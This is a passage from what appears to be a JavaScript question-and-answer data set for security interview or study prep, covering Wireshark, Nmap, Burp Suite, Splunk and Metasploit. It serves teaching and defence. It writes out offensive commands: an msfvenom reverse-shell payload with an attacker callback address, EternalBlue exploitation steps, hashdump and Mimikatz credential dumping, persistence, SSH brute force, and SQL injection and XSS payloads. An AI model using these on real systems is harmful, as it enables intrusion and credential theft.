      { q:'What is Wireshark and what can you analyse with it?', hint:'Packet analyser: captures and inspects network traffic in real time. Protocol dissectors: TCP/IP, HTTP, DNS, TLS, ARP. Capture filters vs display filters. Use cases: troubleshooting, security analysis, protocol learning.', answer:`Wireshark is an open-source network protocol analyser that captures packets from a network interface and dissects them in human-readable detail. It displays each packet with all protocol layers - Ethernet frame, IP header, TCP/UDP header, and application-layer payload. Protocol support: Wireshark includes dissectors for thousands of protocols including HTTP/HTTPS, DNS, DHCP, ARP, ICMP, TLS, SSH, FTP, SMTP, VoIP (SIP/RTP). Use cases: troubleshooting connectivity issues (why is this TCP connection resetting?), analysing application behaviour (what requests does this app make?), security analysis (detecting ARP poisoning, unusual outbound connections, unencrypted credentials), and protocol learning (understanding the actual bytes in a three-way handshake). Capture filters (set before capture) use BPF syntax to limit captured traffic: host 192.168.1.1 captures only traffic to/from that IP; port 443 captures only HTTPS. Display filters (set after capture) filter the displayed packets with Wireshark syntax: http.request.method == "POST"; dns.qry.name contains "malicious.com"; ip.addr == 10.0.0.1. To capture, you need administrator/root privileges and typically have to enable promiscuous mode to see all traffic on the network segment.` },
      { q:'How do you use Wireshark to troubleshoot TCP connection issues?', hint:'Three-way handshake: SYN, SYN-ACK, ACK. RST: connection reset. Retransmissions: packet loss. Window size zero: flow control. Follow TCP Stream. TCP flags filter. Latency analysis: time delta.', answer:`TCP troubleshooting in Wireshark starts with the connection handshake. Filter to see all TCP traffic between two hosts: tcp && ip.addr == 192.168.1.100 && ip.addr == 10.0.0.50. The three-way handshake should show SYN (client), SYN-ACK (server), ACK (client) in sequence. A RST (reset) flag terminates the connection immediately - a RST in response to a SYN means the port is closed or a firewall is actively rejecting. Wireshark colours retransmissions red by default - excessive retransmissions indicate packet loss between the hosts. TCP Zero Window: when the receiver sets window size to 0, the sender must pause - indicates the receiving application is not reading data fast enough (application-level bottleneck, not network). Follow TCP Stream (right-click any packet > Follow > TCP Stream) reassembles the conversation into human-readable format showing the complete request and response exchange. Time delta between packets: add the "Time since previous displayed packet" column to measure inter-packet delays - a sudden spike identifies where latency is introduced. Duplicate ACKs (three in a row) indicate packet loss triggering TCP fast retransmit.` },
      { q:'How do you capture and filter HTTP traffic in Wireshark?', hint:'Display filter: http. Follow HTTP stream. Request headers, response codes. POST body (unencrypted only). Export HTTP objects. SSL/TLS decryption with pre-master secret log. Credentials in plaintext.', answer:`HTTP analysis in Wireshark: display filter http shows all HTTP frames. Individual request/response pairs appear as separate packets - a GET request shows the URL, headers, and query parameters in the packet detail pane. Follow HTTP Stream (right-click > Follow > HTTP Stream) reassembles the full request-response pair into readable text: GET / HTTP/1.1, Host: example.com headers, response body. For security analysis, plain HTTP traffic exposes credentials, API keys, and session tokens in the packet body - this is why HTTPS is mandatory. POST request bodies (form submissions, API payloads) appear in the data portion unencrypted for HTTP. Export HTTP Objects (File > Export Objects > HTTP) saves all downloaded files (images, scripts, documents) from a capture - useful in forensic analysis to recover transferred files. For HTTPS/TLS decryption: configure the browser to log pre-master secrets (SSLKEYLOGFILE environment variable for Chrome/Firefox), then load the key log in Wireshark (Edit > Preferences > Protocols > TLS > Pre-Master-Secret log). This decrypts TLS traffic for analysis - only works on your own traffic and requires the key log from the session you are analysing.` },
      { q:'How do you use Wireshark for network security analysis?', hint:'ARP poisoning detection: duplicate IP with different MAC. DNS anomalies: unusual queries, long TTLs. Unencrypted credentials. Port scan signature: many SYN to different ports. Suspicious outbound: unusual destination IPs.', answer:`Security analysis with Wireshark focuses on anomalies and known attack patterns. ARP Poisoning (Man-in-the-Middle) detection: filter arp and look for gratuitous ARP replies or multiple MAC addresses claiming the same IP - arp.duplicate-address-detected is a Wireshark expert info alert. DNS anomalies: dns.flags.rcode != 0 shows DNS errors; unusually long domain names or random-looking subdomains indicate DNS tunnelling (data exfiltration via DNS queries); dns.qry.name contains TXT or MX records to unusual domains. Port scanning signature: many TCP SYN packets to different destination ports from one source with no corresponding SYN-ACK - tcp.flags.syn==1 && tcp.flags.ack==0 shows SYN-only packets. Unencrypted credential detection: http.request.method == "POST" on sensitive paths (/login, /api/auth), FTP traffic (ftp.request.command == "PASS" shows passwords in clear text), Telnet sessions (everything is clear text). Suspicious outbound connections: ip.dst != 192.168.0.0/16 and ip.dst != 10.0.0.0/8 filters for external connections - unusual high-volume outbound transfers or connections to known-bad IP ranges (cross-reference with threat intelligence).` },
      { q:'What are Wireshark display filters and how do you write complex ones?', hint:'BPF for capture, Wireshark DSL for display. Comparison: ==, !=, >, <, contains, matches. Logical: &&, ||, !. Protocol fields: ip.src, tcp.port, http.host. Substring: [0:4]. Follow from selected.', answer:`Wireshark display filters use a powerful domain-specific language. Basic comparisons: ip.src == 192.168.1.1, tcp.dstport == 80, http.response.code == 200. String operations: http.host contains "example" (substring match), http.host matches ".*\\.evil\\.com" (regex with matches operator). Logical combinations: tcp.port == 80 || tcp.port == 443 (HTTP or HTTPS), ip.addr == 10.0.0.1 && !tcp.flags.syn (traffic to host, excluding SYN packets). Negation: !(arp) hides all ARP traffic. Protocol existence: http (shows only packets with HTTP data). Range operator: tcp.payload[0:4] == 47:45:54:20 matches packets starting with "GET " in ASCII hex. Useful compound filters: credentials hunting: http.request.method == "POST" && http contains "password". Retransmission analysis: tcp.analysis.retransmission. Long HTTP responses: http.content_length > 100000. DNS tunnelling hunting: dns && dns.qry.name.len > 50 finds suspiciously long domain names. Save frequently used filters as bookmarks with the + button in the filter toolbar. The Wireshark wiki has comprehensive protocol field references for every supported protocol.` },
    ],
    nmap: [
      { q:'What is Nmap and what are its primary use cases?', hint:'Network mapper: host discovery, port scanning, service detection, OS detection, script scanning. Use cases: network inventory, security auditing, firewall testing, vulnerability discovery. Always get authorisation first.', answer:`Nmap (Network Mapper) is the industry-standard tool for network discovery and security auditing. Primary capabilities: Host Discovery (which hosts are alive on a network), Port Scanning (which ports are open/closed/filtered), Service Detection (what application is listening on each open port and its version), OS Detection (what operating system is the target running), and Script Scanning (NSE scripts that test for specific vulnerabilities, misconfigurations, or enumerate service details). Use cases: network inventory auditing (document all devices and services in your environment), security assessments (identify attack surface before an attacker does), firewall rule validation (verify only intended ports are accessible), and penetration testing reconnaissance. Critical ethics note: only scan systems you own or have explicit written authorisation to scan. Unauthorised Nmap scanning is illegal in many jurisdictions and violates acceptable use policies. In authorised penetration tests or CTF environments, Nmap is the standard first-step reconnaissance tool.` },
      { q:'Explain common Nmap scan types. What is the difference between -sS, -sT, and -sU?', hint:'-sS: SYN scan (stealth, half-open). -sT: TCP connect scan (full handshake, logged). -sU: UDP scan (slow, unreliable). -sV: version detection. -sC: default scripts. -O: OS detection. -A: aggressive (OS+version+scripts).', answer:`Nmap scan types control how the probe packets are constructed. TCP SYN scan (-sS, requires root): sends a SYN, waits for SYN-ACK (port open) or RST (port closed) or no response (filtered). Never completes the handshake - the connection is torn down with RST after SYN-ACK. This is "stealthy" because many older logging systems only record completed connections, and it is faster than full connect. TCP Connect scan (-sT, works without root): performs a full three-way handshake using the OS socket API. Slower and more detectable (creates a full connection that is logged), but works without root privileges and through some firewalls. UDP scan (-sU, very slow): sends UDP probes to target ports; an ICMP port-unreachable response means closed; no response means open|filtered; some services respond with UDP packets. UDP scanning is slow because UDP does not guarantee delivery and retransmits are needed. Service version detection (-sV) probes open ports to determine the application name and version (Apache 2.4.51, OpenSSH 8.2). OS detection (-O) analyses TCP/IP fingerprints to identify the operating system. Aggressive scan (-A) combines -sV, -O, -sC (default scripts), and traceroute in one command.` },
      { q:'How do you use Nmap NSE (Nmap Scripting Engine)?', hint:'NSE: Lua scripts for automation. Categories: auth, brute, discovery, exploit, safe, vuln. --script=vuln, --script=http-title. Script output. Writing custom NSE scripts. Common scripts: smb-vuln-ms17-010, ssl-heartbleed.', answer:`The Nmap Scripting Engine extends Nmap with Lua-based scripts for advanced automation. Scripts are categorised: safe (unlikely to crash targets), intrusive (may crash or be disruptive), auth (authentication bypass testing), brute (credential brute forcing), discovery (additional network information), exploit (actively exploit vulnerabilities), vuln (check for known vulnerabilities). Common usage: --script=default (same as -sC, runs safe discovery scripts), --script=vuln (checks for known vulnerabilities - includes ms17-010 EternalBlue, ssl-heartbleed, http-slowloris), --script=banner (grabs service banners for version info). Specific script examples: nmap --script smb-vuln-ms17-010 target checks for the EternalBlue vulnerability (WannaCry ransomware vector). nmap --script ssl-heartbleed checks for Heartbleed in OpenSSL. nmap --script http-enum target enumerates web server directories. nmap --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt brute-forces SSH (authorised testing only). --script-args passes arguments to scripts. NSE scripts are located in /usr/share/nmap/scripts - browse them by category or search with ls /usr/share/nmap/scripts/*vuln*.` },
      { q:'How do you perform a comprehensive network reconnaissance with Nmap?', hint:'Phased approach: host discovery > port scan > service detection > vulnerability scan. -p- for all ports. --min-rate for speed. Output formats: -oA (all formats). Timing templates: -T4. Exclude hosts. Script args.', answer:`Comprehensive reconnaissance follows a phased approach to balance thoroughness and stealth. Phase 1 - Host discovery: nmap -sn 192.168.1.0/24 (ping scan, no port scan) quickly identifies live hosts. Phase 2 - Port scan on live hosts: nmap -sS -p- --min-rate 5000 192.168.1.0/24 scans all 65,535 ports with a minimum rate of 5,000 packets per second. -p- is essential since default top-1000-ports scans miss many services on non-standard ports. Phase 3 - Service and version detection on open ports: nmap -sV -sC -p 22,80,443,8080 target combines version detection with default scripts for common open ports. Phase 4 - Vulnerability scanning: nmap --script vuln -p <open_ports> target runs vulnerability checks. Output: -oA output_prefix saves in all formats (XML for import into tools, grepable .gnmap for command-line parsing, normal .nmap for reading). Timing: -T4 (aggressive) is appropriate for local networks; -T2 (polite) for slower environments or to avoid detection. Always save output files - you reference them throughout the engagement.` },
    ],
    burp: [
      { q:'What is Burp Suite and what are its core tools?', hint:'Web application security testing. Proxy: intercept browser traffic. Scanner: automated vulnerability detection. Repeater: manual request replay. Intruder: fuzzing and enumeration. Decoder. Sequencer for token analysis. Extensions via BApp Store.', answer:`Burp Suite is the industry-standard toolkit for web application security testing, developed by PortSwigger. Core tools: Proxy intercepts all HTTP/HTTPS traffic between your browser and the target, allowing you to inspect, modify, and replay every request and response. The browser must be configured to use Burp as a proxy (127.0.0.1:8080) and the Burp CA certificate must be installed to intercept HTTPS. Repeater sends individual intercepted requests and manually modifies parameters, headers, or body content to test how the application responds - essential for manual vulnerability testing. Intruder automates payload injection into defined positions: use it for brute forcing, fuzzing for injection vulnerabilities, and enumerating valid usernames. Scanner (Pro version) runs automated active scanning for common vulnerabilities including SQL injection, XSS, XXE, SSRF, and more. Decoder encodes/decodes data in various formats (Base64, URL, HTML entities, hex) and computes hashes. Sequencer analyses the randomness of session tokens to detect predictable token generation. Extensions via the BApp Store add capabilities: Active Scan++ extends the scanner, Param Miner finds hidden parameters, JWT Editor handles JWT tokens. Burp Community edition is free; Pro adds the active scanner.` },
      { q:'How do you use Burp Proxy to intercept and modify web requests?', hint:'Configure browser proxy: 127.0.0.1:8080. Install Burp CA certificate. Intercept on/off. HTTP history. Modify requests: add headers, change parameters. Forward vs drop. Scope: limit to target domain.', answer:`Burp Proxy workflow: configure your browser to use 127.0.0.1:8080 as the HTTP and HTTPS proxy (use FoxyProxy browser extension for easy toggle between proxy and direct). Import Burp CA certificate (download from http://burpsuite or Proxy > Options > CA Certificate) into your browser certificate store - this enables HTTPS interception by acting as a trusted man-in-the-middle. With Intercept On, every request pauses and displays in Burp before forwarding - you can inspect and modify any part of the request (URL, headers, cookies, body). Common modifications for security testing: change parameter values to test input validation (SQL injection payloads, XSS vectors), add or remove headers (X-Forwarded-For for IP bypass testing, Authorization header), modify cookies (tamper with session tokens, privilege escalation by changing user ID). Intercept Off still records everything in HTTP History - browse the application normally, then review the full request history to understand the attack surface. Set Target Scope (Target > Scope) to limit recording and scanning to the target domain - prevents noise from CDN and analytics requests. Right-click any request to Send to Repeater, Scanner, or Intruder.` },
      { q:'How do you use Burp Intruder for fuzzing and brute forcing?', hint:'Mark positions with §. Attack types: Sniper, Battering Ram, Pitchfork, Cluster Bomb. Payload sets. Payload processing: prefix/suffix, encoding. Response analysis: length, status code, error strings. Rate limiting.', answer:`Burp Intruder automates sending many requests with varying payload values. Send a request to Intruder (Ctrl+I or right-click > Send to Intruder). In the Positions tab, mark injection positions with § delimiters - Burp auto-marks parameters, or mark manually. Attack types: Sniper inserts one payload list across positions one at a time (good for testing one parameter at a time). Battering Ram inserts the same payload into all positions simultaneously. Pitchfork uses multiple payload lists, iterating them in parallel (payload 1 from list A with payload 1 from list B - for credential testing when you have username/password pairs). Cluster Bomb tries all combinations of multiple payload lists - use for brute forcing when you have separate username and password lists. Payload types: Simple List (wordlist of values), Numbers (ranges), Dates, Character Frobber (varies each character). Payload processing adds rules: URL-encode, Base64-encode, prefix/suffix strings. Result analysis: sort by Response Length (successful injections often return different-length responses than failed ones), Status Code (302 redirect often means successful login), or custom match strings in the response ("Invalid credentials" vs no such message). Community edition rate-limits Intruder to 1 request/second - Pro removes this limit.` },
      { q:'How do you test for SQL injection using Burp Suite?', hint:'Identify parameters. Single quote test. Error-based detection. Boolean-based: change logic. Time-based: sleep(). Burp Scanner detects automatically. SQLMap integration. Confirm in Repeater.', answer:`SQL injection testing workflow in Burp. Identify parameters: review HTTP History for all parameters in URL query strings, POST body, cookies, and custom headers - any parameter that gets reflected in the database is a candidate. Send the request to Repeater. Basic tests: append a single quote to a parameter value - if the response changes (database error, different content, or error 500 vs normal 200), the parameter is likely concatenated unsanitized into a SQL query. Boolean-based blind testing: change a condition - if the original parameter is id=1, try id=1 AND 1=1 (should behave normally) and id=1 AND 1=2 (should return empty or different result). Time-based blind: id=1; SELECT SLEEP(5) -- causes a 5-second delay detectable in Repeater response time - works when the application returns no visible error or content difference. Error messages: MySQL, MSSQL, Oracle, and PostgreSQL have distinct error message formats that reveal both the vulnerability and the database type. Confirm findings in Repeater before reporting. Burp Scanner (Pro) detects SQL injection automatically during active scanning. SQLMap (external tool) automates exploitation with extracted data - point it at the vulnerable parameter for in-depth exploitation in authorised tests.` },
      { q:'How do you test for XSS (Cross-Site Scripting) with Burp Suite?', hint:'Reflected: payload in request, rendered in response. Stored: payload persists. DOM-based: JS sink. Test: <script>alert(1)</script>. Burp Scanner. Context: HTML, attribute, JS. WAF bypass. CSP.', answer:`XSS testing in Burp starts with identifying where user input is reflected in the HTML response. In HTTP History, identify parameters whose values appear in the response. Send to Repeater. Initial test: inject <script>alert(1)</script> and inspect the response HTML - if the script tag appears unencoded in the response body, it is likely vulnerable. Check the reflection context: is your payload inside an HTML element (inject <script>), inside an attribute (inject " onmouseover="alert(1)), or inside JavaScript code (inject ';alert(1)//). Each context requires different payload structure. Burp Scanner automatically detects many XSS patterns and suggests exploitable payloads. For Stored XSS, the payload is submitted once (e.g., in a profile field or comment) and retrieved later when another user views it - monitor responses for stored input when retrieving pages after submission. DOM-based XSS requires JavaScript source code analysis to find sinks (document.write, innerHTML, eval) fed by sources (location.hash, location.search). For CSP bypass testing, the Burp extension DOM Invader (built into Burp browser) traces DOM XSS paths. WAF bypass: try encoding variations (&#60;script&#62;, mixed case <ScRiPt>, Unicode encoding) and check if the WAF blocks your specific payload.` },
      { q:'How do you test authentication and session management with Burp Suite?', hint:'Brute force login: Intruder. Session token analysis: Sequencer. Session fixation. Predictable tokens. Insecure transport. Cookie flags: Secure, HttpOnly, SameSite. IDOR: change user ID in requests.', answer:`Authentication testing workflow: Login form brute force in Intruder with Cluster Bomb (username list x password list) - watch for length/status code differences indicating success. Or Sniper to test password policies (length, complexity bypasses). Session token analysis: after capturing a token, send to Sequencer (right-click > Send to Sequencer). Run the automatic analysis - Sequencer makes 200+ requests to gather token samples and applies FIPS 140-2 statistical randomness tests. A low randomness score means tokens are predictable. Cookie security flags: in HTTP History, check the Set-Cookie response header. Missing Secure flag means cookies are sent over HTTP. Missing HttpOnly allows JavaScript access (XSS can steal the cookie). Missing SameSite=Strict/Lax enables CSRF. Session fixation: if the application accepts an attacker-controlled session ID in the URL before login and does not rotate it post-login, the attacker can pre-set a known session ID. IDOR (Insecure Direct Object Reference): in Repeater, change a user ID, order ID, or document ID in a request - if the server returns another user data without authorisation check, it is an IDOR vulnerability. Test with two Burp browser sessions (two different users) to confirm cross-user data access.` },
    ],
    splunk: [
      { q:'What is Splunk and how does it work as a SIEM?', hint:'SIEM: Security Information and Event Management. Splunk: data ingestion, indexing, search (SPL). Forwarders send data. Indexers store. Search heads query. Correlation rules detect threats. Dashboards. Alerts. ES app for security.', answer:`Splunk is a platform for searching, monitoring, and analysing machine-generated data - positioned as a SIEM (Security Information and Event Management) through its Enterprise Security (ES) app. Architecture: Universal Forwarders are lightweight agents installed on endpoints, servers, and network devices that ship logs to Splunk Indexers. Heavy Forwarders perform parsing and filtering before forwarding. Indexers receive, parse (extract fields, apply sourcetypes), and index data into time-series repositories. Search Heads handle user queries and distribute search jobs to indexers. SPL (Splunk Processing Language) is the query language: event search -> transformation commands -> visualisation. SIEM use cases: correlating firewall logs + authentication logs + endpoint logs to detect lateral movement, privilege escalation, or data exfiltration. Splunk Enterprise Security provides pre-built correlation searches, risk-based alerting, incident review workflows, and notable event management - the standard enterprise SIEM workflow. For smaller deployments without ES, Splunk Free or Splunk Cloud with custom correlation searches covers basic use cases.` },
      { q:'How do you write SPL (Splunk Processing Language) queries?', hint:'Pipe structure: search | command | command. Fields: field=value. Wildcards: *. Stats: count, sum, avg by field. Eval: derived fields. Timechart. Dedup. Lookup. rex for regex extraction. head/tail.', answer:`SPL follows a pipeline structure where each pipe stage transforms or analyses the results from the previous stage. Basic search: index=security sourcetype=windows_security EventCode=4624 (successful logon) filters events. The | pipe passes results to transformation commands. stats command: index=security EventCode=4624 | stats count by user, src_ip counts login events by user and source IP. timechart command: index=nginx status>=400 | timechart count by status creates a time-series count by HTTP status code. eval creates derived fields: | eval risk_score = if(failed_logins > 5, "HIGH", "LOW"). rex extracts fields with regex: | rex field=_raw "user=(?<username>\w+)" creates a username field from raw log text. dedup removes duplicate events by field: | dedup src_ip keeps only the first event per source IP. lookup enriches events from a lookup table (CSV file): | lookup geo_lookup src_ip OUTPUTNEW country, city adds geolocation. sort and head/tail limit and order results: | sort -count | head 10 shows top 10. where filters after stats: | stats count by src_ip | where count > 100 finds IPs with more than 100 requests. transaction groups related events: | transaction user maxspan=5m creates sessions from login sequences.` },
      { q:'How do you create Splunk dashboards and alerts for security monitoring?', hint:'Dashboard: XML panels, searches, time pickers. Visualisations: table, chart, map, single value. Scheduled searches. Alerts: trigger conditions, throttling, actions (email, PagerDuty, webhook). Notable events in ES. Real-time vs scheduled.', answer:`Splunk dashboards are built in the Dashboard Editor or XML. Each panel runs a saved search and renders a visualisation: chart, table, map, single value metric, or event list. Input tokens (dropdowns, time range pickers) make dashboards interactive - panels reference $token$ variables. A SOC dashboard typically includes: failed login attempts over time (timechart), geographic map of authentication sources, top processes by network connections, and a table of recent notable events. Alerts trigger when a search returns results meeting a condition. Scheduled alerts run on a cron schedule: every 5 minutes check for brute force indicators (more than 10 failed logins from the same IP in 1 minute). Real-time alerts trigger the moment matching events arrive but consume more resources. Throttling prevents alert storms by limiting notifications to once per X minutes per host. Alert actions: email, webhook (PagerDuty, Slack, JIRA), run a script, or create a notable event in Splunk ES. Splunk ES Correlation Searches are alerts with risk-based scoring - each detection contributes to a risk score per user/asset; when the accumulated risk exceeds a threshold, a notable event fires. This risk-based alerting reduces false positives compared to threshold-only alerting.` },
      { q:'How do you use Splunk for threat hunting?', hint:'Hypothesis-driven investigation. Start broad, narrow down. Baseline normal behaviour. Statistical outliers. Rare values: rare command. Known attacker TTPs: MITRE ATT&CK. Hunting for LOLBins, lateral movement, C2 beaconing.', answer:`Threat hunting in Splunk is proactive - actively searching for threats that have evaded automated detection. Approach: form a hypothesis based on threat intelligence or intuition (e.g., "we may have a credential-stuffing attack using valid-but-compromised accounts"), then query the data to confirm or deny it. Establishing baselines: index=windows sourcetype=WinEventLog EventCode=4624 | stats count by user | eventstats avg(count) as avg_count | where count > avg_count * 3 finds users with abnormally high login counts. Rare command finds uncommon values - rare processes executing in an environment are suspicious: index=endpoint | stats count by process_name | where count < 5 | sort count. MITRE ATT&CK technique hunting: for T1059 (Command Line Interface), search for PowerShell executions with encoded commands: index=windows process_name="powershell.exe" CommandLine="*-enc*" or CommandLine="*-EncodedCommand*". C2 beaconing detection: network connections that fire at regular intervals - index=network | timechart count by dest_ip span=5m | eventstats stdev(count) as stdev by dest_ip | where stdev < 1 finds suspiciously regular connections. LOLBins (Living-Off-the-Land Binaries): monitor certutil, mshta, regsvr32, rundll32 for unusual parent processes or network connections.` },
      { q:'How do you integrate Splunk with other security tools?', hint:'Syslog: standard log forwarding. API: HTTP Event Collector (HEC). SOAR integration: Splunk SOAR (Phantom). Threat intelligence: STIX/TAXII feeds. CIM: Common Information Model for normalisation. Add-ons (TAs) for vendor parsing.', answer:`Splunk integrates with the security ecosystem through multiple mechanisms. Log collection: Syslog (UDP/TCP 514) for network devices (firewalls, switches, load balancers) and servers. HTTP Event Collector (HEC) provides a REST API endpoint for applications to push JSON events without an agent - used for cloud services, custom applications, and serverless functions. Universal Forwarder agents on Windows/Linux collect event logs, file tails, and WMI data. Technology Add-ons (TAs/Apps) from Splunkbase provide pre-built parsing for vendor products: Splunk Add-on for Microsoft Windows, Palo Alto Networks Add-on, CrowdStrike Falcon Add-on - each TA maps vendor-specific fields to the Common Information Model (CIM). CIM normalises field names across data sources: src_ip, dest_ip, user, action are consistent regardless of source, enabling cross-source correlation. Threat Intelligence: ingest STIX/TAXII feeds via Splunk ES Threat Intelligence Framework - indicators (IPs, domains, hashes) are matched against incoming events to generate risk scores. Splunk SOAR (formerly Phantom) is the SOAR (Security Orchestration, Automation, and Response) platform that triggers automated response playbooks from Splunk ES notable events - blocking an IP, isolating an endpoint, or sending enrichment data back to Splunk.` },
      { q:'How do Splunk indexes, sourcetypes, and data models work?', hint:'Index: data repository, retention, access control. Sourcetype: parsing instructions, field extraction. Data model: CIM-compliant structured schema. Pivot for accelerated searches. Tstats command for fast DM queries.', answer:`Splunk data organisation has three key layers. Indexes are the storage repositories - each index has configurable retention period, storage path, and access controls. Separate sensitive data into restricted indexes: index=pci_logs with ACL limiting to compliance team. Common indexes: main (default), security, network, endpoint, windows, linux. Sourcetypes define how Splunk parses raw events - they specify timestamp extraction patterns, line break rules, and field extraction transforms. Each sourcetype has configuration in props.conf and transforms.conf. Splunkbase provides sourcetypes for thousands of products; custom sourcetypes are created for proprietary log formats. Data Models are structured schemas built on top of indexed data - the CIM Authentication data model normalises login events from all sources into common fields (user, src, dest, action). The Pivot interface allows non-SPL users to query data models visually. Accelerated Data Models materialise summarised data in a separate datastore, making tstats searches extremely fast: | tstats count where index=security by host, user runs in milliseconds against accelerated models vs seconds for raw searches. Splunk ES relies heavily on CIM-compliant data models - properly tagging your sourcetypes with CIM models is the most important step for ES to work correctly.` },
    ],
    metasploit: [
      { q:'What is Metasploit Framework and what are its main components?', hint:'MSF: penetration testing framework. msfconsole: CLI. Modules: exploit, auxiliary, post, payload, encoder, evasion. msfdb: vulnerability database. Workspaces. Sessions. Only use on authorised targets.', answer:`Metasploit Framework is the world most widely used penetration testing platform for developing, testing, and executing exploits. It provides a standardised interface for the exploit lifecycle. msfconsole is the primary CLI interface - interactive shell with tab completion, command history, and module management. Module categories: Exploits execute vulnerability-specific attack code against a target to gain code execution. Auxiliary modules perform scanning, enumeration, fuzzing, brute forcing, and other non-exploitation tasks. Post modules run after gaining a session - privilege escalation, credential harvesting, persistence, lateral movement. Payloads are the code that executes on the target after successful exploitation - Meterpreter (advanced in-memory agent), shell (basic shell), stager/stage (two-stage delivery for bypassing size limits). Encoders obfuscate payloads to evade signature-based detection. Evasion modules generate AV-evasive payloads. The msfdb PostgreSQL database stores scan results, hosts, and session history. Workspaces segregate engagements: workspace -a client_pentest creates an isolated namespace. Legal requirement: Metasploit use on systems without explicit written authorisation constitutes computer crime in virtually all jurisdictions.` },
      { q:'Walk through the Metasploit exploitation workflow for a pentest.', hint:'Recon: nmap -sV to identify services. Search: search type:exploit. Use module: use. Show options. Set RHOSTS, LHOST, LPORT, payload. Check: check. Run/exploit. Meterpreter session. Post-exploitation.', answer:`Standard Metasploit exploitation workflow on authorised targets. Reconnaissance: nmap -sV -p- target produces service version information. Import nmap results: db_nmap -sV target stores results in the workspace database. hosts and services commands show discovered assets. Vulnerability identification: search cve:2021-44228 or search type:exploit platform:windows name:ms17 finds relevant modules. Module selection: use exploit/windows/smb/ms17_010_eternalblue selects the EternalBlue SMB exploit. show info displays the module description, CVE references, and required options. Configuration: set RHOSTS 192.168.1.100 sets the target, set LHOST 192.168.1.50 sets the attacker IP, set PAYLOAD windows/x64/meterpreter/reverse_tcp selects the payload. show options confirms all required parameters are set. Validation: check verifies the target appears vulnerable before exploitation. Execution: run or exploit executes the module. If successful: sessions -l lists active sessions, sessions -i 1 interacts with session 1. Meterpreter commands: sysinfo, getuid, getsystem (privilege escalation attempt), hashdump (extract password hashes), upload/download (file transfer), shell (drop to OS shell). Post-exploitation: run post/multi/recon/local_exploit_suggester suggests local privilege escalation options.` },
      { q:'What is Meterpreter and what can you do with it?', hint:'In-memory agent, runs in existing process. Encrypted comms. Commands: sysinfo, getuid, getsystem, hashdump, upload, download, screenshot, keyscan. Pivoting: route, portfwd. Persistence. Load modules: kiwi (mimikatz).', answer:`Meterpreter is Metasploit most powerful payload - an advanced, dynamically extensible, in-memory agent injected into a running process. Unlike a basic shell, Meterpreter never writes a file to disk (making it harder to detect), communicates over an encrypted channel, and can load additional modules dynamically. Core commands: sysinfo returns OS, hostname, and architecture. getuid shows current user privileges. getsystem attempts privilege escalation (by trying multiple local exploit techniques - token impersonation, named pipe, etc.). hashdump extracts NTLM password hashes from SAM or LSASS (requires SYSTEM privileges). upload loot.exe /tmp/loot.exe and download C:\\sensitive.txt transfer files. screenshot captures the current desktop. keyscan_start/keyscan_dump activates a keylogger. Network pivoting: route add 10.10.10.0/24 extends the Metasploit routing through the compromised host, enabling attacks on internal networks. portfwd add -l 3389 -p 3389 -r 10.10.10.50 tunnels RDP to an internal host through the session. load kiwi loads the Mimikatz module for credential extraction from Windows memory (creds_all dumps all credentials). These capabilities demonstrate exactly why defence-in-depth matters: each Meterpreter capability maps to a defensive control (EDR, LSASS protection, network segmentation).` },
      { q:'How do you generate and use custom payloads with msfvenom?', hint:'msfvenom: payload generation. -p payload -f format -o output. Staged vs stageless. Encoding: -e x86/shikata_ga_nai. LHOST/LPORT. Formats: exe, dll, ps1, elf, apk. AV evasion limitations.', answer:`msfvenom is the standalone payload generator combining msfpayload and msfencode. Basic usage: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe generates a Windows executable that calls back to the attacker. Payload types: staged (windows/x64/meterpreter/reverse_tcp) - small initial stager downloads the full Meterpreter from the Metasploit handler; stageless (windows/x64/meterpreter_reverse_tcp) - self-contained, larger but does not need a network call to load. Format options: exe (Windows executable), dll (DLL for DLL hijacking), ps1 (PowerShell script), elf (Linux executable), apk (Android package), asp/aspx (web shell), python/ruby/java. Encoding: -e x86/shikata_ga_nai -i 5 applies the Shikata Ga Nai encoder 5 times - reduces but does not eliminate AV detection. Modern AV/EDR detects Metasploit payloads reliably through behavioural analysis regardless of encoding. For handlers: msfconsole > use multi/handler > set payload same_as_msfvenom > set LHOST and LPORT > run starts the listener waiting for the callback. In practice, successful red team engagements use custom payload frameworks beyond Metasploit to evade modern EDR.` },
      { q:'How do Metasploit modules work? How do you write a custom auxiliary module?', hint:'Module structure: metadata (Name, Description, Author, License), initialize method, info hash, run method. Mixins: Msf::Exploit::Remote::Tcp. RHOSTS option. Rex::Socket. DATASTORE. Report findings.', answer:`Metasploit modules are Ruby classes with a standard structure. An auxiliary module: class MetasploitModule < Msf::Auxiliary; include Msf::Auxiliary::Scanner; include Msf::Exploit::Remote::Tcp. The initialize method defines metadata (Name, Description, Author, License, References) and options: register_options([Opt::RPORT(8080), OptString.new("PATH", [true, "URL path", "/api/health"])]). The run_host(ip) method (for Scanner modules that iterate over RHOSTS) contains the actual logic using Rex::Socket for network communication or the framework HTTP client for web requests: res = send_request_raw({'uri' => datastore['PATH'], 'method' => 'GET'}). Report findings: report_host, report_service, report_vuln, and store_loot save results to the workspace database - viewable with the hosts, services, and vulns commands. Place the module in ~/.msf4/modules/auxiliary/custom/ and run reload_all in msfconsole. Mixins provide reusable functionality: Msf::Exploit::Remote::Tcp for TCP connections, Msf::Auxiliary::Scanner for RHOSTS iteration, Msf::Auxiliary::AuthBrute for credential brute forcing with throttling. Writing custom modules enables testing for proprietary vulnerabilities or application-specific logic flaws not covered by public modules.` },
      { q:'How do you use Metasploit for post-exploitation activities?', hint:'Privilege escalation: getsystem, local_exploit_suggester. Credential harvesting: hashdump, kiwi. Persistence: schtasks, registry. Pivoting: routing. Lateral movement: psexec, pass-the-hash. Token impersonation. Clearing tracks.', answer:`Post-exploitation is everything that happens after gaining initial access. Privilege escalation: getsystem attempts multiple techniques (named pipe impersonation, token duplication) to escalate from user to SYSTEM on Windows. run post/multi/recon/local_exploit_suggester identifies unpatched local privilege escalation vulnerabilities for the specific OS version. Credential harvesting: run post/windows/gather/hashdump extracts local account hashes from SAM (requires SYSTEM). load kiwi; creds_all dumps plaintext credentials, NTLM hashes, and Kerberos tickets from LSASS memory (requires SYSTEM, targets Windows only). Persistence: run post/windows/manage/persistence creates a registry run key or scheduled task to maintain access after reboot. Pivoting to internal networks: route add 10.10.10.0/24 1 adds a route through session 1; socks modules set up a SOCKS proxy for proxychains. Lateral movement: use exploit/windows/smb/psexec with harvested credentials moves to another Windows host. Pass-the-Hash: use the NTLM hash directly without 